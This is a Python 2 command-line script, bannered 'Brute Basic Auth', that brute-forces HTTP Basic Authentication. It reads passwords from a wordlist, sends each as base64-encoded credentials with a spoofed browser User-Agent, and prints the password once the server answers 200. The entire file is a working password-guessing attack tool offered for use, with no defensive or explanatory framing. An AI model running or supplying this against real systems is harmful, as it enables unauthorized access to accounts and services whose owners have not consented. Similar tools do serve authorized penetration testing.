# encoding: utf-8
#python 2.7.18
import sys,requests,base64

def banner():
    print('''
  ____             _         ____            _                      _   _     
 |  _ \           | |       |  _ \          (_)          /\        | | | |    
 | |_) |_ __ _   _| |_ ___  | |_) | __ _ ___ _  ___     /  \  _   _| |_| |__  
 |  _ <| '__| | | | __/ _ \ |  _ < / _` / __| |/ __|   / /\ \| | | | __| '_ \ 
 | |_) | |  | |_| | ||  __/ | |_) | (_| \__ \ | (__   / ____ \ |_| | |_| | | |
 |____/|_|   \__,_|\__\___| |____/ \__,_|___/_|\___| /_/    \_\__,_|\__|_| |_|
                                                                              
                                                                              
    ''')
banner()

if len(sys.argv) != 3: 
    print("Error! Pass the arguments like that: ")
    print("python script.py URL WORDLIST")
    print("python script.py http://192.168.0.4 wordlist.txt")
else:
    user = raw_input("What is the user? ")
    r = open(sys.argv[2], 'r')
    url = sys.argv[1]
    try:
        for i in r.readlines():
            senha = i.rstrip('\n')
            strPass = base64.b64encode(user + ':' + senha)
            header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0', 'Authorization': 'Basic ' + strPass }
            req = requests.get(url, headers=header)
            if str(req.status_code) == '200':
                print('Password found - ' + senha)
                print('Password of ' + user + ' is: ' + senha)
                print(user + ':' + senha)
                quit()
            else:
                print('Incorrect password - ' + senha)
    except:
        print("An error has occurred. Are you sure the URL passed is using Basic HTTP Authentication? ")        
